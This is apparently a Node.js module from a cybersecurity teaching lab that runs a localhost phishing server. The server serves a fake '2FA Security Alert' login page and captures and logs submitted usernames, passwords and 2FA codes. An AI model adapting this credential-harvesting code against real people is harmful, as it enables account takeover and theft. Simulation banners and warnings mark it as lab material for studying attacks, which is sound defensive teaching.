const database = require('../models/database');
const crypto = require('crypto');
const http = require('http');
const url = require('url');

class PhishingAttack {
  constructor() {
    this.attackType = 'phishing';
    this.activeServers = new Map(); // Store active phishing servers
    this.capturedCredentials = new Map(); // Store captured data by attack ID
  }

  async initiate(options) {
    const { targetEmail, phishingDomain, attackMethod, attackerId, template } = options;
    const attackId = crypto.randomUUID();
    // Use dynamic port allocation to avoid conflicts
    const phishingPort = await this.findAvailablePort(9090);
    
    // Create realistic phishing URL on localhost
    const phishingUrl = `http://localhost:${phishingPort}/login?target=${encodeURIComponent(targetEmail)}&id=${attackId}`;
    
    // Log attack initiation
    const attackData = {
      target_email: targetEmail,
      phishing_domain: phishingDomain || 'localhost',
      attack_method: attackMethod,
      template: template || 'fake_login_page',
      phishing_url: phishingUrl,
      phishing_port: phishingPort,
      created_at: new Date().toISOString(),
      server_status: 'starting'
    };

    return new Promise((resolve, reject) => {
      const query = `
        INSERT INTO attack_logs (id, attack_type, target_user_id, attacker_ip, attack_data, status, attack_details, success)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
      `;

      database.getDB().run(query, [
        attackId,
        this.attackType,
        null, // We'll update this if we find the user
        'simulated-attacker-ip',
        JSON.stringify(attackData),
        'active',
        `Phishing Server - ${attackMethod} targeting ${targetEmail}`,
        0
      ], (err) => {
        if (err) {
          reject(err);
        } else {
          // Start the phishing server
          this.startPhishingServer(attackId, phishingPort, attackData)
            .then((serverInfo) => {
              console.log(`🎣 [PHISHING ATTACK] Server started for: ${targetEmail}`);
              console.log(`📧 Subject: "Urgent: Verify Your 2FA Settings"`);
              console.log(`🔗 Phishing URL: ${phishingUrl}`);
              console.log(`🚀 Server running on port: ${phishingPort}`);
              
              resolve({
                attackId,
                phishingUrl: phishingUrl,
                status: 'active',
                serverInfo,
                instructions: {
                  title: "Phishing Attack Active",
                  steps: [
                    `1. Phishing server is now running on port ${phishingPort}`,
                    `2. Click the phishing URL to see the fake login page`,
                    `3. Enter credentials to simulate victim interaction`,
                    `4. Monitor the attack dashboard for captured data`
                  ],
                  warnings: [
                    "⚠️ This is a simulation for educational purposes",
                    "🔒 Never use these techniques against real targets",
                    "📚 Understand the attack to better defend against it"
                  ]
                }
              });
            })
            .catch(reject);
        }
      });
    });
  }

  async startPhishingServer(attackId, port, attackData) {
    return new Promise((resolve, reject) => {
      // Create phishing HTTP server
      const phishingServer = http.createServer((req, res) => {
        this.handlePhishingRequest(req, res, attackId, attackData);
      });

      phishingServer.listen(port, (err) => {
        if (err) {
          console.error(`❌ [PHISHING] Failed to start server on port ${port}:`, err);
          reject(err);
        } else {
          console.log(`🚀 [PHISHING] Server started on port ${port}`);
          
          // Store the server instance
          this.activeServers.set(attackId, phishingServer);
          this.capturedCredentials.set(attackId, []);
          
          // Update attack status
          const updateQuery = `
            UPDATE attack_logs 
            SET status = 'active',
                attack_data = json_patch(attack_data, json('{"server_status": "running", "started_at": "' || datetime('now') || '"}'))
            WHERE id = ?
          `;
          
          database.getDB().run(updateQuery, [attackId], (dbErr) => {
            if (dbErr) {
              console.error('Error updating attack status:', dbErr);
            }
          });

          resolve({
            port,
            url: `http://localhost:${port}`,
            status: 'running',
            message: 'Phishing server is active and ready to capture credentials'
          });
        }
      });

      phishingServer.on('error', (err) => {
        console.error(`❌ [PHISHING] Server error:`, err);
        reject(err);
      });
    });
  }

  handlePhishingRequest(req, res, attackId, attackData) {
    const parsedUrl = url.parse(req.url, true);
    const method = req.method;
    
    console.log(`🎣 [PHISHING REQUEST] ${method} ${req.url}`);

    if (method === 'GET' && parsedUrl.pathname === '/login') {
      // Serve the phishing login page
      const targetEmail = parsedUrl.query.target || 'user@example.com';
      const phishingPage = this.generatePhishingPage(attackId, targetEmail);
      
      res.writeHead(200, {
        'Content-Type': 'text/html',
        'X-Frame-Options': 'DENY' // Prevent embedding for realism
      });
      res.end(phishingPage);
      
    } else if (method === 'POST' && parsedUrl.pathname === '/login') {
      // Handle credential submission
      let body = '';
      req.on('data', chunk => {
        body += chunk.toString();
      });

      req.on('end', () => {
        this.captureCredentials(attackId, body, req.headers);
        
        // Send realistic response
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(`
          <!DOCTYPE html>
          <html>
          <head>
            <title>Verification Successful</title>
            <meta charset="UTF-8">
            <style>
              body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f0f8ff; }
              .success { color: #28a745; font-size: 24px; margin: 20px 0; }
              .message { color: #666; font-size: 16px; }
            </style>
          </head>
          <body>
            <h1 class="success">✅ Verification Successful!</h1>
            <p class="message">Your account has been verified and secured.</p>
            <p class="message">You can now close this window.</p>
            <hr style="margin: 30px 0;">
            <small style="color: #999;">🚨 PHISHING SIMULATION - Credentials Captured for Educational Demo</small>
          </body>
          </html>
        `);
      });
      
    } else {
      // 404 for other paths
      res.writeHead(404, { 'Content-Type': 'text/html' });
      res.end(`
        <html>
          <body style="font-family: Arial, sans-serif; text-align: center; padding: 50px;">
            <h1>404 - Page Not Found</h1>
            <p>The page you're looking for doesn't exist.</p>
            <p><a href="/login">← Back to Login</a></p>
          </body>
        </html>
      `);
    }
  }

  captureCredentials(attackId, formData, headers) {
    const timestamp = new Date().toISOString();
    
    // Debug: Log raw form data
    console.log(`📊 [DEBUG] Raw form data:`, formData);
    
    const params = new URLSearchParams(formData);
    
    const capturedData = {
      timestamp,
      username: params.get('username') || params.get('email') || '',
      password: params.get('password') || '',
      otp: params.get('otp') || params.get('code') || params.get('2fa') || '',
      userAgent: headers['user-agent'] || '',
      ip: headers['x-forwarded-for'] || '127.0.0.1',
      formData: Object.fromEntries(params)
    };

    console.log(`\n🎯 [PHISHING SUCCESS] Attack ID: ${attackId}`);
    console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
    console.log(`👤 Username: ${capturedData.username || '❌ NOT CAPTURED'}`);
    console.log(`🔑 Password: ${capturedData.password || '❌ NOT CAPTURED'}`);
    console.log(`📱 2FA Code: ${capturedData.otp || '❌ NOT PROVIDED'}`);
    console.log(`🌐 IP Address: ${capturedData.ip}`);
    console.log(`💻 User Agent: ${capturedData.userAgent.substring(0, 50)}...`);
    console.log(`⏰ Timestamp: ${timestamp}`);
    console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`);

    // Store captured credentials in memory
    const existingData = this.capturedCredentials.get(attackId) || [];
    existingData.push(capturedData);
    this.capturedCredentials.set(attackId, existingData);

    // Prepare credentials for database (don't store actual password, just indicate it was captured)
    const credentialsForDB = {
      username: capturedData.username,
      password: capturedData.password ? '***CAPTURED***' : null,
      totp: capturedData.otp || null,
      user_agent: capturedData.userAgent,
      ip_address: capturedData.ip,
      timestamp: capturedData.timestamp,
      capture_method: 'phishing_form'
    };

    // Update attack as successful and store captured credentials
    const updateQuery = `
      UPDATE attack_logs 
      SET success = 1,
          status = 'successful',
          captured_credentials = ?
      WHERE id = ?
    `;
    
    database.getDB().run(updateQuery, [JSON.stringify(credentialsForDB), attackId], (err) => {
      if (err) {
        console.error('Error updating attack success:', err);
      } else {
        console.log(`✅ [PHISHING SUCCESS] Attack ${attackId} - credentials captured and stored!`);
        console.log(`📊 Database updated with captured credentials`);
        
        // Also store captured credentials separately for easy retrieval
        const insertCredQuery = `
          INSERT INTO attack_logs (id, attack_type, target_user_id, attacker_ip, attack_data, status, attack_details, success, timestamp)
          VALUES (?, 'credential_capture', NULL, 'phishing-victim', ?, 'captured', ?, 1, datetime('now'))
        `;
        
        database.getDB().run(insertCredQuery, [
          `${attackId}_credentials`,
          JSON.stringify(capturedData),
          `Credentials captured from phishing attack ${attackId}`
        ], (credErr) => {
          if (credErr) {
            console.error('Error storing credentials:', credErr);
          } else {
            console.log(`📊 [CREDENTIALS STORED] Separate record created for captured data`);
          }
        });
      }
    });
  }

  generatePhishingPage(attackId, targetEmail = 'user@example.com') {
    return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2FA Cyber Lab - Security Verification</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            margin: 0;
            padding: 20px;
            background: #f5f5f5;
        }
        .container {
            max-width: 400px;
            margin: 50px auto;
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #dc2626;
            margin: 0;
        }
        .alert {
            background: #fef2f2;
            border: 1px solid #fecaca;
            color: #dc2626;
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #d1d5db;
            border-radius: 6px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            background: #dc2626;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background: #b91c1c;
        }
        .warning {
            margin-top: 20px;
            padding: 15px;
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 6px;
            font-size: 12px;
            color: #856404;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>🔒 2FA Security Alert</h1>
        </div>
        
        <div class="alert">
            <strong>⚠️ Security Notice:</strong> Suspicious login activity detected on your account. Please verify your credentials immediately.
        </div>

        <form id="phishingForm" method="POST" action="/login">
            <div class="form-group">
                <label for="username">Email or Username:</label>
                <input type="text" id="username" name="username" value="${targetEmail}" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <div class="form-group">
                <label for="otp">2FA Code:</label>
                <input type="text" id="otp" name="otp" placeholder="Enter 6-digit code" maxlength="6" required>
            </div>
            
            <button type="submit">🔒 Verify & Secure Account</button>
        </form>

        <div class="warning">
            ⚠️ <strong>EDUCATIONAL SIMULATION:</strong> This is a phishing attack simulation for the 2FA Cyber Attacks Lab. 
            In a real scenario, never enter your credentials on suspicious pages. Always verify the URL and look for security indicators.
        </div>
    </div>

    <script>
        // Add some realistic behavior to make the phishing page more convincing
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('phishingForm');
            const submitBtn = form.querySelector('button');
            
            form.addEventListener('submit', function() {
                submitBtn.textContent = '🔄 Verifying...';
                submitBtn.disabled = true;
            });
            
            // Auto-focus username field
            document.getElementById('username').focus();
        });
    </script>
</body>
</html>`;
  }

  async getStatus(attackId) {
    return new Promise((resolve, reject) => {
      const query = 'SELECT * FROM attack_logs WHERE id = ?';
      
      database.getDB().get(query, [attackId], (err, row) => {
        if (err) {
          reject(err);
        } else if (row) {
          resolve({
            attack_id: attackId,
            status: row.status,
            attack_data: JSON.parse(row.attack_data),
            created_at: row.created_at,
            updated_at: row.updated_at
          });
        } else {
          reject(new Error('Attack not found'));
        }
      });
    });
  }

  async getStatus(attackId) {
    return new Promise((resolve, reject) => {
      const query = `
        SELECT 
          id,
          status,
          attack_data,
          success,
          created_at,
          updated_at
        FROM attack_logs 
        WHERE id = ?
      `;

      database.getDB().get(query, [attackId], (err, row) => {
        if (err) {
          reject(err);
        } else if (!row) {
          reject(new Error('Attack not found'));
        } else {
          const attackData = JSON.parse(row.attack_data);
          const capturedData = this.capturedCredentials.get(attackId) || [];
          const isServerRunning = this.activeServers.has(attackId);

          resolve({
            attackId: row.id,
            status: row.status,
            success: row.success === 1,
            serverRunning: isServerRunning,
            phishingUrl: attackData.phishing_url,
            targetEmail: attackData.target_email,
            template: attackData.template,
            credentialsCaptured: capturedData.length,
            lastCapture: capturedData.length > 0 ? capturedData[capturedData.length - 1].timestamp : null,
            created_at: row.created_at,
            attackData: attackData,
            capturedCredentials: capturedData.slice(-3) // Last 3 captures for preview
          });
        }
      });
    });
  }

  async stopAttack(attackId) {
    return new Promise((resolve, reject) => {
      // Stop the phishing server if running
      const phishingServer = this.activeServers.get(attackId);
      
      if (phishingServer) {
        phishingServer.close(() => {
          console.log(`🛑 [PHISHING] Stopped server for attack ${attackId}`);
          
          // Clean up
          this.activeServers.delete(attackId);
          
          // Update attack status
          const updateQuery = `
            UPDATE attack_logs 
            SET status = 'stopped',
                attack_data = json_patch(attack_data, json('{"server_status": "stopped", "stopped_at": "' || datetime('now') || '"}'))
            WHERE id = ?
          `;
          
          database.getDB().run(updateQuery, [attackId], (err) => {
            if (err) {
              reject(err);
            } else {
              const capturedData = this.capturedCredentials.get(attackId) || [];
              resolve({
                success: true,
                message: 'Phishing attack stopped successfully',
                totalCaptures: capturedData.length,
                credentialsCaptured: capturedData.length > 0
              });
            }
          });
        });
      } else {
        // Attack wasn't running or already stopped
        resolve({
          success: true,
          message: 'Attack was not running or already stopped'
        });
      }
    });
  }

  // Find an available port starting from the given port number
  async findAvailablePort(startPort) {
    const net = require('net');
    
    for (let port = startPort; port < startPort + 100; port++) {
      try {
        await this.checkPortAvailable(port);
        console.log(`🔍 [PHISHING] Found available port: ${port}`);
        return port;
      } catch (err) {
        // Port is in use, try next one
        continue;
      }
    }
    
    // If we can't find an available port, use a random high port
    const randomPort = Math.floor(Math.random() * 1000) + 9000;
    console.log(`🔍 [PHISHING] Using random port: ${randomPort}`);
    return randomPort;
  }

  checkPortAvailable(port) {
    return new Promise((resolve, reject) => {
      const server = require('net').createServer();
      
      server.listen(port, (err) => {
        if (err) {
          reject(err);
        } else {
          server.close(() => {
            resolve(port);
          });
        }
      });
      
      server.on('error', (err) => {
        reject(err);
      });
    });
  }

  // Clean up all active servers (useful for server shutdown)
  stopAllAttacks() {
    console.log(`🛑 [PHISHING CLEANUP] Stopping ${this.activeServers.size} active servers`);
    
    for (const [attackId, server] of this.activeServers) {
      server.close();
      console.log(`🛑 Stopped phishing server for attack ${attackId}`);
    }
    
    this.activeServers.clear();
    this.capturedCredentials.clear();
  }
}

module.exports = PhishingAttack;